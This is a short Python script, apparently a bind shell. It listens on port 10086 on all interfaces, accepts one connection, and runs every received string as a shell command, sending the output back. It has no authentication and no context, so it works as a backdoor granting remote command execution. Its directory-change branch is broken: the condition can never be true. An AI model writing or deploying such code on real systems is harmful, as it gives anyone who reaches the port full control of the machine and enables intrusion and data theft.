import os
import socket
import sys
port=10086
s=socket.socket()
s.bind(('0.0.0.0',port))
s.listen(1)
wf,addr=s.accept()
print(f'{addr}success！')
while 1:
    cmd=wf.recv(1024).decode()
    if cmd=='exit':
        break
    if cmd=='cd' and len(cmd)>2:
        os.chdir(cmd[2:].strip())
    result=os.popen(cmd).read()
    if not result:
        result='ok'
    wf.send(result.encode())
wf.close()
print("Mission complete")
